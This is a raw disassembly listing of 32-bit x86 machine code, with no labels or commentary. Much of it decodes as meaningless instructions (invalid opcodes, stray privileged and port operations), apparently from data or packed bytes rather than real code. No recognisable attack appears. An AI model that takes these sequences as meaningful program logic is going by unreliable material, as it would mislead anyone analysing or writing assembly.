  40fe14:	dec    esp
  40fe15:	push   0x57b44021
  40fe1a:	adc    eax,esi
  40fe1c:	dec    esp
  40fe1d:	inc    eax
  40fe1e:	jae    0x40fe80
  40fe20:	clc    
  40fe21:	out    0x67,al
  40fe23:	inc    eax
  40fe24:	cmp    eax,0x42584360
  40fe29:	inc    esp
  40fe2a:	mov    ah,0xa3
  40fe2c:	ret    
  40fe2d:	inc    ebp
  40fe2e:	das    
  40fe2f:	or     al,0x28
  40fe31:	sub    al,0x44
  40fe33:	xchg   ecx,eax
  40fe34:	outs   dx,DWORD PTR ds:[esi]
  40fe35:	cmp    eax,0xb4bc4041
  40fe3a:	adc    DWORD PTR [edx+0x4b],esp
  40fe3d:	inc    ebp
  40fe3e:	or     DWORD PTR [ecx],ebp
  40fe40:	or     eax,0x46056f6f
  40fe45:	aas    
  40fe46:	inc    edx
  40fe47:	add    al,0xcb
  40fe49:	popf   
  40fe4a:	call   0x2e867ed6
  40fe4f:	inc    eax
  40fe50:	es inc esp
  40fe52:	aam    0xd
  40fe54:	jmp    0x40fe95
  40fe56:	into   
  40fe57:	pusha  
  40fe58:	lods   al,BYTE PTR ds:[esi]
  40fe59:	sub    al,0x94
  40fe5b:	xchg   esi,eax
  40fe5c:	test   al,0x0
  40fe5e:	fstp   TBYTE PTR [eax*1+0x128444b2]
  40fe65:	mov    edi,0xc5cb4045
  40fe6a:	adc    DWORD PTR ds:0x2301cf30,ecx
  40fe70:	inc    eax
  40fe71:	ins    BYTE PTR es:[edi],dx
  40fe72:	push   0x4150d3c9
  40fe77:	inc    eax
  40fe78:	mov    ds:0x529cbcfe,al
  40fe7d:	jmp    FWORD PTR [edi+0x29]
  40fe80:	add    DWORD PTR [ebp+ecx*1+0x41],0xe8430a28
  40fe88:	inc    edi
  40fe89:	sub    al,0x7b
  40fe8b:	push   cs
  40fe8c:	int    0xf7
  40fe8e:	sbb    DWORD PTR [eax+0x64],eax
  40fe91:	mov    al,0xb4
  40fe93:	lock push ebx
  40fe95:	or     al,BYTE PTR [edx+0x33]
  40fe98:	and    al,0xd5
  40fe9a:	or     eax,0x25ff4088
  40fe9f:	inc    eax
  40fea0:	arpl   WORD PTR [ebx-0x35],bx
  40fea3:	add    eax,0x604f00f6
  40fea8:	push   eax
  40fea9:	test   BYTE PTR [ebx-0x79],0x6c
  40fead:	pop    edi
  40feae:	inc    eax
  40feaf:	jl     0x40fefd
  40feb1:	inc    esp
  40feb2:	jne    0x40fef4
  40feb4:	not    ecx
  40feb6:	xor    BYTE PTR [edx-0x37],al
  40feb9:	sub    al,0xa8
  40febb:	inc    ecx
  40febc:	test   al,0x53
  40febe:	jno    0x40fee4
  40fec0:	es scas al,BYTE PTR es:[edi]
  40fec2:	push   ebp
  40fec3:	and    ch,bh
  40fec5:	push   0x40
  40fec7:	call   0x3893cc1e
  40fecc:	inc    eax
  40fecd:	adc    esi,DWORD PTR [ebp+0x305b0e42]
  40fed3:	jle    0x40feb7
  40fed5:	outs   dx,BYTE PTR ds:[esi]
  40fed6:	and    eax,0xeff60c37
  40fedb:	clc    
  40fedc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fedd:	shl    DWORD PTR [ecx+0x4a],cl
  40fee0:	retf   
  40fee1:	inc    esp
  40fee2:	pushf  
  40fee3:	cld    
  40fee4:	sub    al,cl
  40fee6:	inc    eax
  40fee7:	inc    eax
  40fee8:	es sub al,0xfb
  40feeb:	dec    ebx
  40feec:	imul   edx,DWORD PTR [ecx-0x53479fcd],0x4c
  40fef3:	shl    DWORD PTR ds:0x354052bf,1
  40fef9:	inc    eax
  40fefa:	(bad)  
  40fefb:	iret   
  40fefc:	dec    ebx
  40fefd:	adc    BYTE PTR [eax+0x6c],al
  40ff00:	retf   
  40ff01:	int    0xc4
  40ff03:	dec    ecx
  40ff04:	dec    esp
  40ff05:	push   ebp
  40ff06:	and    DWORD PTR [eax-0x50],eax
  40ff09:	imul   ecx,DWORD PTR [edi-0x6f],0x2e5a6e3d
  40ff10:	or     eax,0xc36c44aa
  40ff15:	push   ebx
  40ff16:	inc    eax
  40ff17:	push   0x5002d5cb
  40ff1c:	and    BYTE PTR [esi+0x21],ch
  40ff1f:	inc    eax
  40ff20:	lods   al,BYTE PTR ds:[esi]
  40ff21:	inc    ecx
  40ff22:	push   0x20
  40ff24:	stos   DWORD PTR es:[edi],eax
  40ff25:	xor    eax,0xee052d66
  40ff2a:	mov    WORD PTR [edi+0x4c],gs
  40ff2d:	leave  
  40ff2e:	inc    ecx
  40ff2f:	inc    edx
  40ff30:	retf   
  40ff31:	dec    eax
  40ff32:	cmp    cl,BYTE PTR [esi]
  40ff34:	pop    edi
  40ff35:	xchg   ebp,eax
  40ff36:	adc    eax,0x62304f40
  40ff3b:	icebp  
  40ff3c:	enter  0x3e71,0x28
  40ff40:	inc    ecx
  40ff41:	test   al,0xc2
  40ff43:	pushf  
  40ff44:	adc    al,0x75
  40ff46:	dec    eax
  40ff47:	inc    eax
  40ff48:	je     0x40ff17
  40ff4a:	mov    esp,0x24449c05
  40ff4f:	and    eax,0xcd154b56
  40ff54:	test   al,0xb9
  40ff56:	xor    dh,BYTE PTR [eax]
  40ff58:	or     al,0xe6
  40ff5a:	and    al,0x62
  40ff5c:	adc    BYTE PTR [esi],ah
  40ff5e:	inc    edx
  40ff5f:	inc    eax
  40ff60:	xor    al,0x4c
  40ff62:	and    dh,BYTE PTR [ebx]
  40ff64:	test   al,0x71
  40ff66:	xor    BYTE PTR [edx],dh
  40ff68:	loope  0x40ff9e
  40ff6a:	dec    ecx
  40ff6b:	pusha  
  40ff6c:	add    eax,0xbe404058
  40ff71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff72:	lock loopne 0x40ffb8
  40ff75:	adc    ah,BYTE PTR [eax+0x25]
  40ff78:	lds    ebx,FWORD PTR fs:[esp+eiz*2+0x78]
  40ff7d:	mov    edi,0x4fc94876
  40ff82:	inc    esp
  40ff83:	push   ebx
  40ff84:	cmp    al,0x26
  40ff86:	inc    eax
  40ff87:	inc    eax
  40ff88:	jo     0x40ff80
  40ff8a:	add    DWORD PTR [ebp+0x43],ebp
  40ff8d:	arpl   WORD PTR ds:0x674ce534,si
  40ff93:	sub    DWORD PTR [eax+0x1940e2d6],0x6d631334
  40ff9d:	or     al,0x40
  40ff9f:	cs test al,0xa4
  40ffa2:	pop    eax
  40ffa3:	es mov ch,0xc
  40ffa6:	xor    DWORD PTR [eax+0x42],eax
  40ffa9:	js     0x40fffc
  40ffab:	fsub   QWORD PTR [ebp-0x31caa943]
  40ffb1:	mov    ebp,0x4a840de
  40ffb6:	inc    edx
  40ffb7:	inc    eax
  40ffb8:	xchg   ebx,eax
  40ffb9:	or     al,0x44
  40ffbb:	sub    cl,BYTE PTR [edi]
  40ffbd:	xchg   ebx,eax
  40ffbe:	sub    eax,0x4dc6660
  40ffc3:	(bad)  
  40ffc4:	mov    ah,0x3a
  40ffc6:	pop    edx
  40ffc7:	inc    eax
  40ffc8:	bound  ebp,QWORD PTR es:[ecx-0x7a]
  40ffcc:	xor    edx,DWORD PTR [ebx]
  40ffce:	inc    eax
  40ffcf:	cmc    
  40ffd0:	xor    al,0xc5
  40ffd2:	push   eax
  40ffd3:	bound  edi,QWORD PTR [eax]
  40ffd5:	adc    BYTE PTR [ecx],ch
  40ffd7:	pop    esi
  40ffd8:	mov    edi,0x2869b04f
  40ffdd:	adc    eax,DWORD PTR [eax+0x40]
  40ffe0:	mov    al,0x45
  40ffe2:	inc    ecx
  40ffe3:	fsubr  QWORD PTR [eax+0x7c]
  40ffe6:	sub    eax,0x94c74140
  40ffeb:	cdq    
  40ffec:	xor    eax,0x21000032
  40fff1:	outs   dx,DWORD PTR ds:[esi]
  40fff2:	add    BYTE PTR [eax],al
  40fff4:	pop    ds
  40fff5:	mov    ah,0x0
  40fff7:	add    BYTE PTR [eax],ah
  40fff9:	inc    BYTE PTR [eax]
  40fffb:	add    BYTE PTR [ecx],ah
  40fffd:	inc    ecx
  40fffe:	add    DWORD PTR [eax],eax
  410000:	pop    ds
  410001:	test   BYTE PTR [ecx],al
  410003:	add    BYTE PTR [ebx],ah
  410005:	mov    ebx,0x5200001
  41000a:	add    al,BYTE PTR [eax]
  41000c:	and    dl,BYTE PTR [esi+0x2]
  41000f:	add    BYTE PTR [edx],ah
  410011:	mov    al,0x2
  410013:	add    BYTE PTR [edx],ah
  410015:	or     al,BYTE PTR [eax]
  410017:	int3   
  410018:	jmp    DWORD PTR ds:0x4290e8
  41001e:	int3   
  41001f:	int3   
  410020:	mov    edx,ecx
  410022:	mov    ebx,DWORD PTR [ebp-0x10]
  410025:	xor    eax,eax
  410027:	inc    edx
  410028:	mov    ecx,DWORD PTR [edx]
  41002a:	inc    eax
  41002b:	inc    cl
  41002d:	dec    cl
  41002f:	jne    0x410027
  410031:	dec    eax
  410032:	ret    
  410033:	int3   
  410034:	int3   
  410035:	int3   
  410036:	int3   
  410037:	int3   
  410038:	int3   
  410039:	int3   
  41003a:	int3   
  41003b:	int3   
  41003c:	int3   
  41003d:	int3   
  41003e:	int3   
  41003f:	int3   
  410040:	mov    ebx,ecx
  410042:	xor    eax,ebx
  410044:	jmp    0x41b00a
  410049:	int3   
  41004a:	int3   
  41004b:	int3   
  41004c:	int3   
  41004d:	int3   
  41004e:	int3   
  41004f:	int3   
  410050:	bound  eax,QWORD PTR [eax+0x0]
  410053:	inc    ebx
  410054:	int3   
  410055:	inc    eax
  410056:	add    eax,0x78434040
  41005b:	bound  eax,QWORD PTR [ecx+0x78]
  41005e:	add    eax,0x62404043
  410063:	jne    0x410011
  410065:	retf   
  410066:	stc    
  410067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410068:	outs   dx,BYTE PTR ds:[esi]
  410069:	out    dx,eax
  41006a:	lds    ecx,FWORD PTR [edx+eax*2+0x50]
  41006e:	out    0x9,al
  410070:	push   edx
  410071:	push   edx
  410072:	inc    edx
  410073:	bound  ecx,QWORD PTR [edx]
  410075:	inc    ecx
  410076:	add    eax,0xfea9e0ad
  41007b:	imul   eax,DWORD PTR [ebp*8+0x5f2d1e41],0x44
  410083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410084:	leave  
  410085:	xchg   esp,eax
  410086:	inc    ecx
  410087:	retf   0xa24b
  41008a:	sub    al,0x39
  41008c:	es inc ecx
  41008e:	inc    eax
  41008f:	add    eax,0x43436240
  410094:	add    eax,0x62004040
  410099:	inc    eax
  41009a:	add    BYTE PTR [ecx+0x40],al
  41009d:	inc    ebx
  41009e:	test   BYTE PTR ds:0x58054041,ah
  4100a4:	inc    eax
  4100a5:	inc    eax
  4100a6:	bound  eax,QWORD PTR [eax+0x66]
  4100a9:	inc    ecx
  4100aa:	inc    eax
  4100ab:	add    eax,0xd0c06400
  4100b0:	and    bh,BYTE PTR [ecx]
  4100b2:	push   eax
  4100b3:	xor    al,BYTE PTR [esi]
  4100b5:	inc    esi
  4100b6:	xor    al,0x34
  4100b8:	outs   dx,BYTE PTR ds:[esi]
  4100b9:	cs aad 0x8c
  4100bc:	inc    esp
  4100bd:	and    al,0xf8
  4100bf:	pop    ss
  4100c0:	dec    ebp
  4100c1:	inc    edx
  4100c2:	adc    al,0xda
  4100c4:	retf   
  4100c5:	popa   
  4100c6:	in     al,0x9b
  4100c8:	stos   DWORD PTR es:[edi],eax
  4100c9:	mov    al,ds:0xa826b9ee
  4100ce:	jo     0x4100d0
  4100d0:	add    BYTE PTR [ebx+0x40],al
  4100d3:	bound  eax,QWORD PTR ds:0x25404110
  4100d9:	add    ah,cl
  4100db:	inc    ebx
  4100dc:	add    eax,0x40402562
  4100e1:	add    BYTE PTR [eax+0x40],al
  4100e4:	inc    ecx
  4100e5:	inc    ecx
  4100e6:	add    eax,0x78434025
  4100eb:	bound  eax,QWORD PTR [eax-0x7c]
  4100ee:	inc    eax
  4100ef:	inc    ecx
  4100f0:	push   0x45
  4100f2:	sub    eax,DWORD PTR [edx+eiz*2-0x4c]
  4100f6:	adc    dh,bh
  4100f8:	stos   BYTE PTR es:[edi],al
  4100f9:	mov    ds:0x35622c55,eax
  4100fe:	mov    al,0x26
  410100:	jae    0x410144
  410102:	jae    0x410152
  410104:	cmp    al,0xcb
  410106:	inc    ecx
  410107:	cli    
  410108:	push   cs
  410109:	pusha  
  41010a:	inc    ebp
  41010b:	xor    eax,0xe2a8b80d
  410110:	leave  
  410111:	pop    ss
  410112:	and    DWORD PTR [ebp+0x36244a79],ecx
  410118:	inc    eax
  410119:	xor    eax,DWORD PTR [ecx+0x40]
  41011c:	inc    eax
  41011d:	inc    ebx
  41011e:	int3   
  41011f:	add    BYTE PTR ds:0x56240,al
  410125:	inc    ebx
  410126:	inc    eax
  410127:	inc    eax
  410128:	add    BYTE PTR [ecx+0x62],al
  41012b:	bound  eax,QWORD PTR [eax]
  41012d:	int3   
  41012e:	inc    eax
  41012f:	inc    ebx
  410130:	add    eax,0x43624041
  410135:	adc    BYTE PTR [ecx+0x5],al
  410138:	inc    eax
  410139:	push   eax
  41013a:	inc    esp
  41013b:	mov    esp,0x40cf07a4
  410140:	inc    edx
  410141:	mov    eax,ds:0xe8c80d2c
  410146:	inc    ax
  410148:	stos   DWORD PTR es:[edi],eax
  410149:	gs dec esp
  41014b:	imul   esp,DWORD PTR [ebx+0x73],0xffffffe0
  41014f:	add    al,0x44
  410151:	and    al,ch
  410153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410154:	mov    eax,0xe0400534
  410159:	xor    eax,0x40436221
  41015e:	adc    BYTE PTR ds:0x4158cc40,al
  410164:	inc    ebx
  410165:	bound  eax,QWORD PTR [ecx+0x40]
  410168:	add    eax,0x4140
  41016d:	and    eax,0x40400062
  410172:	add    eax,0x84404340
  410177:	int3   
  410178:	js     0x41017a
  41017a:	inc    ecx
  41017b:	adc    BYTE PTR [edx+0xf],ah
  41017e:	or     eax,0x40768e3b
  410183:	daa    
  410184:	jg     0x410184
  410186:	inc    esp
  410187:	shl    esi,1
  410189:	jmp    0x2669:0x44a24240
  410190:	arpl   ax,di
  410192:	or     al,0x21
  410194:	std    
  410195:	sub    al,0xf0
  410197:	inc    edx
  410198:	dec    ecx
  410199:	inc    eax
  41019a:	inc    eax
  41019b:	inc    edx
  41019c:	add    BYTE PTR [eax+0x41],al
  41019f:	inc    eax
  4101a0:	inc    ebx
  4101a1:	bound  ax,DWORD PTR ds:0x40434100
  4101a8:	add    eax,0x40054062
  4101ad:	bound  eax,QWORD PTR [ecx+0x40]
  4101b0:	inc    ebx
  4101b1:	inc    eax
  4101b2:	add    eax,0x25405841
  4101b7:	bound  eax,QWORD PTR [eax+0x43]
  4101ba:	inc    eax
  4101bb:	adc    BYTE PTR [ecx],ah
  4101bd:	dec    edx
  4101be:	inc    edx
  4101bf:	or     ah,BYTE PTR [eax+eax*2-0x2ab01fee]
  4101c6:	enter  0x3e04,0x44
  4101ca:	inc    eax
  4101cb:	xor    al,0xa7
  4101cd:	adc    dl,ah
  4101cf:	retf   
  4101d0:	bound  esi,QWORD PTR ds:0x40434140
  4101d6:	add    eax,0x43406262
  4101db:	inc    ecx
  4101dc:	adc    BYTE PTR [eax],al
  4101de:	inc    eax
  4101df:	add    eax,0x43000562
  4101e4:	add    BYTE PTR [ecx+0x40],al
  4101e7:	inc    eax
  4101e8:	add    eax,0x400062
  4101ed:	inc    ebx
  4101ee:	inc    eax
  4101ef:	js     0x410232
  4101f1:	inc    ecx
  4101f2:	bound  eax,QWORD PTR [eax+0x15]
  4101f5:	in     al,0x17
  4101f7:	inc    ah
  4101f9:	es jns 0x4101a5
  4101fc:	inc    eax
  4101fd:	mov    ds:0xb44f4422,al
  410202:	arpl   WORD PTR [esi+ebp*2+0x4062322d],di
  410209:	add    eax,0x40430041
  41020e:	inc    eax
  41020f:	inc    ecx
  410210:	inc    eax
  410211:	inc    eax
  410212:	bound  eax,QWORD PTR ds:0x5624300
  410218:	add    BYTE PTR [eax+0x40],al
  41021b:	add    BYTE PTR [ecx+0x43],al
  41021e:	add    BYTE PTR [eax+0x41],al
  410221:	add    eax,0x40436200
  410226:	inc    eax
  410227:	add    eax,0x15a42c62
  41022c:	or     BYTE PTR [eax+eax*2+0x2a],al
  410230:	pop    edi
  410231:	dec    eax
  410232:	inc    ecx
  410233:	inc    ebp
  410234:	xor    eax,0xe1470ec9
  410239:	int    0x70
  41023b:	aaa    
  41023c:	adc    BYTE PTR [eax+0x40],0xa2
  410240:	dec    eax
  410241:	sbb    ebp,esp
  410243:	rol    ch,0x62
  410246:	wrmsr  
  410248:	mov    eax,ds:0x916262fe
  41024d:	jl     0x41028f
  41024f:	dec    eax
  410250:	inc    ecx
  410251:	inc    eax
  410252:	add    eax,0x41624340
  410257:	test   BYTE PTR [eax],al
  410259:	and    eax,0x404043
  41025e:	add    BYTE PTR ds:0x626210,al
  410264:	add    eax,0x43404140
  410269:	inc    eax
  41026a:	inc    ecx
  41026b:	add    eax,0x10664062
  410270:	inc    ebx
  410271:	bound  edx,QWORD PTR [ebp+0x44]
  410274:	retf   
  410275:	jb     0x4102b9
  410277:	sub    al,0x9
  410279:	fs popa 
  41027b:	sub    al,0x64
  41027d:	cmp    al,0x39
  41027f:	dec    esi
  410280:	inc    eax
  410281:	outs   dx,BYTE PTR ds:[esi]
  410282:	jns    0x4102ca
  410284:	xor    eax,0x14352890
  410289:	inc    eax
  41028a:	(bad)  
  41028b:	out    0x63,al
  41028d:	jnp    0x4102f1
  41028f:	inc    eax
  410290:	inc    eax
  410291:	popa   
  410292:	das    
  410293:	popf   
  410294:	fs inc edx
  410296:	xor    BYTE PTR [eax+0x3],bl
  410299:	inc    ebp
  41029a:	or     eax,0xcc05d893
  41029f:	inc    ecx
  4102a0:	inc    eax
  4102a1:	add    BYTE PTR [eax],al
  4102a3:	add    BYTE PTR [eax+0x40],al
  4102a6:	inc    ebx
  4102a7:	bound  eax,QWORD PTR [eax]
  4102a9:	inc    eax
  4102aa:	inc    eax
  4102ab:	add    eax,0x62434162
  4102b0:	inc    eax
  4102b1:	js     0x4102c3
  4102b3:	inc    ecx
  4102b4:	add    eax,0x5404325
  4102b9:	bound  eax,QWORD PTR [eax+0x40]
  4102bc:	inc    ecx
  4102bd:	inc    ebx
  4102be:	add    DWORD PTR [edx+0x3d],ecx
  4102c1:	inc    eax
  4102c2:	and    BYTE PTR [ecx+0x2c],ah
  4102c5:	test   BYTE PTR [ecx+edx*8],0xc3
  4102c9:	adc    eax,0xc4447e6f
  4102ce:	not    DWORD PTR [ebx]
  4102d0:	dec    esp
  4102d1:	inc    eax
  4102d2:	push   ss
  4102d3:	outs   dx,BYTE PTR ds:[esi]
  4102d4:	aad    0x4f
  4102d6:	dec    edi
  4102d7:	and    eax,0x436241
  4102dc:	adc    BYTE PTR [eax+0x0],al
  4102df:	add    eax,0x62410040
  4102e4:	inc    eax
  4102e5:	add    BYTE PTR [ebx-0x34],al
  4102e8:	inc    eax
  4102e9:	add    eax,0x78434040
  4102ee:	bound  eax,QWORD PTR [ecx+0x78]
  4102f1:	add    eax,0x62404043
  4102f6:	dec    edx
  4102f7:	xor    al,0x12
  4102f9:	jle    0x4102de
  4102fb:	or     DWORD PTR [eax+0x46],eax
  4102fe:	icebp  
  4102ff:	inc    eax
  410300:	inc    eax
  410301:	pusha  
  410302:	xor    esi,edi
  410304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410305:	pop    edx
  410306:	jle    0x41035c
  410308:	adc    al,0x7a
  41030a:	inc    edi
  41030b:	cmp    DWORD PTR ds:0x403d4438,0xc338e357
  410315:	inc    ecx
  410316:	inc    eax
  410317:	add    eax,0x43436240
  41031c:	add    eax,0x62004040
  410321:	inc    eax
  410322:	add    BYTE PTR [ecx+0x40],al
  410325:	inc    ebx
  410326:	test   BYTE PTR ds:0x58054041,ah
  41032c:	inc    eax
  41032d:	inc    eax
  41032e:	bound  eax,QWORD PTR [eax+0x66]
  410331:	inc    ecx
  410332:	inc    eax
  410333:	add    eax,0xc362d200
  410338:	adc    esp,DWORD PTR [eax]
  41033a:	push   esp
  41033b:	inc    edx
  41033c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41033d:	xor    al,0x11
  41033f:	push   edx
  410340:	inc    eax
  410341:	xor    al,0xe1
  410343:	jp     0x41038a
  410345:	pop    esi
  410346:	test   al,0x4a
  410348:	push   cs
  410349:	inc    ebp
  41034a:	dec    edi
  41034b:	popf   
  41034c:	inc    ebp
  41034d:	ret    0x1c0d
  410350:	inc    eax
  410351:	loopne 0x4103b3
  410353:	std    
  410354:	nop
  410355:	and    al,0xcb
  410357:	ror    BYTE PTR [ecx],1
  410359:	sub    BYTE PTR [eax+0x28],ah
  41035c:	addr16 push ss
  41035e:	inc    ecx
  41035f:	pop    eax
  410360:	inc    eax
  410361:	or     eax,0x4300001e
  410366:	inc    eax
  410367:	bound  eax,QWORD PTR ds:0x25404110
  41036d:	add    ah,cl
  41036f:	inc    ebx
  410370:	add    eax,0x40402562
  410375:	add    BYTE PTR [eax+0x40],al
  410378:	inc    ecx
  410379:	inc    ecx
  41037a:	add    eax,0x78434025
  41037f:	bound  eax,QWORD PTR [eax-0x7c]
  410382:	inc    eax
  410383:	inc    ecx
  410384:	inc    eax
  410385:	inc    ebx
  410386:	inc    ebx
  410387:	jnp    0x4103d4
  410389:	pop    ds
  41038a:	in     eax,dx
  41038b:	push   es
  41038c:	lds    ebp,FWORD PTR [ecx+ecx*4]
  41038f:	dec    esp
  410390:	rol    DWORD PTR [eax+0x75],1
  410393:	and    dh,cl
  410395:	pop    ecx
  410396:	jne    0x4103fb
  410398:	push   0x14
  41039a:	and    DWORD PTR [esi+eiz*4-0x58],esi
  41039e:	xor    BYTE PTR [ecx+ecx*1+0x40],cl
  4103a2:	jmp    0x410420
  4103a4:	fs out 0x43,al
  4103a7:	in     al,0x60
  4103a9:	adc    BYTE PTR [eax-0x5e],ch
  4103ac:	inc    esp
  4103ad:	inc    esi
  4103ae:	inc    ecx
  4103af:	inc    eax
  4103b0:	inc    eax
  4103b1:	inc    ebx
  4103b2:	int3   
  4103b3:	add    BYTE PTR ds:0x56240,al
  4103b9:	inc    ebx
  4103ba:	inc    eax
  4103bb:	inc    eax
  4103bc:	add    BYTE PTR [ecx+0x62],al
  4103bf:	bound  eax,QWORD PTR [eax]
  4103c1:	int3   
  4103c2:	inc    eax
  4103c3:	inc    ebx
  4103c4:	add    eax,0x43624041
  4103c9:	adc    BYTE PTR [ecx+0x5],al
  4103cc:	inc    eax
  4103cd:	mov    DWORD PTR [ebp+0x62],eax
  4103d0:	inc    eax
  4103d1:	popa   
  4103d2:	ins    DWORD PTR es:[edi],dx
  4103d3:	sub    al,0x62
  4103d5:	jo     0x41043a
  4103d7:	lods   al,BYTE PTR ds:[esi]
  4103d8:	sbb    DWORD PTR [edx+0x4f],edx
  4103db:	mov    esi,0xc1732440
  4103e0:	inc    eax
  4103e1:	popa   
  4103e2:	loopne 0x410448
  4103e4:	jno    0x410382
  4103e6:	or     al,0x29
  4103e8:	adc    ah,BYTE PTR [edx+0x43]
  4103eb:	inc    eax
  4103ec:	adc    BYTE PTR ds:0x4158cc40,al
  4103f2:	inc    ebx
  4103f3:	bound  eax,QWORD PTR [ecx+0x40]
  4103f6:	add    eax,0x4140
  4103fb:	and    eax,0x40400062
  410400:	add    eax,0x84404340
  410405:	int3   
  410406:	js     0x410408
  410408:	inc    ecx
  410409:	adc    BYTE PTR [edx+0xf],ah
  41040c:	loop   0x410421
  41040e:	lea    edx,[ecx]
  410410:	test   al,0x64
  410412:	ds inc eax
  410414:	mov    al,ds:0x116244ed
  410419:	cmp    eax,0x202f030f
  41041e:	sub    al,0x96
  410420:	mov    ah,0x40
  410422:	cwde   
  410423:	inc    eax
  410424:	jne    0x410486
  410426:	mov    esp,0x4d64425b
  41042b:	add    eax,0xd5d0ea22
  410430:	add    BYTE PTR [eax+0x41],al
  410433:	inc    eax
  410434:	inc    ebx
  410435:	bound  ax,DWORD PTR ds:0x40434100
  41043c:	add    eax,0x40054062
  410441:	bound  eax,QWORD PTR [ecx+0x40]
  410444:	inc    ebx
  410445:	inc    eax
  410446:	add    eax,0x25405841
  41044b:	bound  eax,QWORD PTR [eax+0x43]
  41044e:	inc    eax
  41044f:	adc    BYTE PTR [esp+eax*8+0x5c],dl
  410453:	inc    eax
  410454:	ins    DWORD PTR es:[edi],dx
  410455:	jb     0x4103e4
  410457:	nop
  410458:	pusha  
  410459:	dec    edi
  41045a:	addr16 add al,0x66
  41045d:	popa   
  41045e:	inc    esp
  41045f:	dec    edi
  410460:	addr16 pusha 
  410462:	push   ds
  410463:	inc    eax
  410464:	inc    ecx
  410465:	inc    ebx
  410466:	inc    eax
  410467:	add    eax,0x43406262
  41046c:	inc    ecx
  41046d:	adc    BYTE PTR [eax],al
  41046f:	inc    eax
  410470:	add    eax,0x43000562
  410475:	add    BYTE PTR [ecx+0x40],al
  410478:	inc    eax
  410479:	add    eax,0x400062
  41047e:	inc    ebx
  41047f:	inc    eax
  410480:	js     0x4104c3
  410482:	inc    ecx
  410483:	bound  eax,QWORD PTR [eax+0x40]
  410486:	bound  eax,QWORD PTR [esp+ebp*1]
  410489:	shr    DWORD PTR [edx+eiz*4-0x5ccbbf4c],0xba
  410491:	dec    edx
  410492:	or     cl,BYTE PTR [esi]
  410494:	inc    ecx
  410495:	inc    eax
  410496:	stos   BYTE PTR es:[edi],al
  410497:	inc    edx
  410498:	(bad)
  41049b:	nop
  41049c:	bound  eax,QWORD PTR [eax+0x5]
  41049f:	inc    ecx
  4104a0:	add    BYTE PTR [ebx+0x40],al
  4104a3:	inc    eax
  4104a4:	inc    ecx
  4104a5:	inc    eax
  4104a6:	inc    eax
  4104a7:	bound  eax,QWORD PTR ds:0x5624300
  4104ad:	add    BYTE PTR [eax+0x40],al
  4104b0:	add    BYTE PTR [ecx+0x43],al
  4104b3:	add    BYTE PTR [eax+0x41],al
  4104b6:	add    eax,0x40436200
  4104bb:	inc    eax
  4104bc:	add    eax,0x43408e62
  4104c1:	mov    ds:0x53647567,al
  4104c6:	je     0x410508
  4104c8:	popa   
  4104c9:	sub    DWORD PTR [esi-0x58],edi
  4104cc:	inc    ebx
  4104cd:	mov    BYTE PTR [eax+0x64dc440c],bh
  4104d3:	adc    al,BYTE PTR [eax-0x1ebf8158]
  4104d9:	dec    cx
  4104db:	mov    eax,0xd261073
  4104e0:	inc    esp
  4104e1:	and    ebp,DWORD PTR [ecx+eax*2]
  4104e4:	repz test al,0x43
  4104e7:	inc    eax
  4104e8:	and    BYTE PTR [esi-0x48],bl
  4104eb:	out    0x36,al
  4104ed:	inc    ecx
  4104ee:	hlt    
  4104ef:	adc    al,0x21
  4104f1:	(bad)  
  4104f2:	aad    0x41
  4104f4:	inc    eax
  4104f5:	add    eax,0x41624340
  4104fa:	test   BYTE PTR [eax],al
  4104fc:	and    eax,0x404043
  410501:	add    BYTE PTR ds:0x626210,al
  410507:	add    eax,0x43404140
  41050c:	inc    eax
  41050d:	inc    ecx
  41050e:	add    eax,0x10664062
  410513:	inc    ebx
  410514:	bound  edi,QWORD PTR [ecx+ebx*2]
  410517:	icebp  
  410518:	jne    0x41055a
  41051a:	aad    0x60
  41051c:	pop    esp
  41051d:	dec    esi
  41051e:	(bad)  
  41051f:	sub    al,0x44
  410521:	or     BYTE PTR [edi],ah
  410523:	stos   BYTE PTR es:[edi],al
  410524:	(bad)  
  410525:	cmp    BYTE PTR [edx+0x63],dl
  410528:	add    eax,0x4041cc
  41052d:	add    BYTE PTR [eax],al
  41052f:	inc    eax
  410530:	inc    eax
  410531:	inc    ebx
  410532:	bound  eax,QWORD PTR [eax]
  410534:	inc    eax
  410535:	inc    eax
  410536:	add    eax,0x62434162
  41053b:	inc    eax
  41053c:	js     0x41054e
  41053e:	inc    ecx
  41053f:	add    eax,0x5404325
  410544:	bound  eax,QWORD PTR [eax+0x40]
  410547:	inc    ecx
  410548:	inc    ebx
  410549:	test   al,0x40
  41054b:	jg     0x4105c4
  41054d:	dec    ecx
  41054e:	(bad)  
  410550:	dec    edx
  410551:	adc    ch,BYTE PTR [esi+0x61]
  410554:	mov    eax,ds:0x4c14202c
  410559:	inc    ecx
  41055a:	inc    eax
  41055b:	dec    ebx
  41055c:	inc    ebx
  41055d:	mov    dh,0xc5
  41055f:	arpl   WORD PTR ds:0xa1a10e45,dx
  410565:	int    0x4f
  410567:	arpl   bp,ax
  410569:	and    BYTE PTR [eax+0x7e],al
  41056c:	dec    edi
  41056d:	or     DWORD PTR [esp+ebx*8+0x27],edx
  410571:	xor    eax,0xfe21250f
  410576:	or     eax,0x40c95263
  41057b:	scas   eax,DWORD PTR es:[edi]
  41057c:	ror    BYTE PTR [ecx+0x7b],cl
  41057f:	in     eax,0xe5
  410581:	and    eax,0x436241
  410586:	adc    BYTE PTR [eax+0x0],al
  410589:	add    eax,0x62410040
  41058e:	inc    eax
  41058f:	add    BYTE PTR [ebx-0x34],al
  410592:	inc    eax
  410593:	add    eax,0x78434040
  410598:	bound  eax,QWORD PTR [ecx+0x78]
  41059b:	add    eax,0x62404043
  4105a0:	stc    
  4105a1:	or     DWORD PTR [ecx+eiz*2+0x2c],eax
  4105a5:	mov    esp,0x4062435e
  4105aa:	and    BYTE PTR [esi],ah
  4105ac:	mov    ah,0xd
  4105ae:	and    DWORD PTR [ebp-0x1ddcebb3],esp
  4105b4:	out    0x44,al
  4105b6:	pop    eax
  4105b7:	ins    BYTE PTR es:[edi],dx
  4105b8:	dec    eax
  4105b9:	inc    eax
  4105ba:	inc    eax
